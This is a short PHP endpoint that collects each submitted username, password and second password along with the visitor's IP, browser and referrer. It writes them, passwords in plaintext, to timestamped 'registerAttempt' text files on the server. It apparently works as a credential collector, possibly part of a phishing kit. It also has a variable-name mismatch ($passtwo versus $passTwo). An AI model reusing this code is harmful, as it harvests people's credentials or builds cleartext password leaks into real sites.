<?php
	//FOR LOGS
	ob_start();
	$dateandtime = date('Ymd_His');
	$ip = $_SERVER['REMOTE_ADDR'];
	$browser = $_SERVER['HTTP_USER_AGENT'];
	$referrer = $_SERVER['HTTP_REFERER'];
	$username=$_POST['username'];
	$pass=$_POST['password'];
	$passtwo=$_POST['secondPassword'];
	$successfull=$_POST['success'];

	echo "\n Visitor IP address: " . $ip;
	echo "\n Browser (User Agent) Info: " . $browser;
	echo "\n Referrer:" . $referrer;
	echo "\n username:" . $username;
	echo "\n pass:" . $pass;
	echo "\n pass:" . $passTwo;
	if($successfull == "yes"){
		$hash = password_hash($pass, PASSWORD_BCRYPT);
		$encoded = base64_encode($hash);
		echo "\n hash:" . $hash;
		echo "\n encoded:" . $encoded;
	}
	echo "\n successfull:".$successfull;
	


	
	file_put_contents("registerAttempt_".$dateandtime.".txt",ob_get_contents(),LOCK_EX);
	ob_end_clean();
	echo "ok";
?>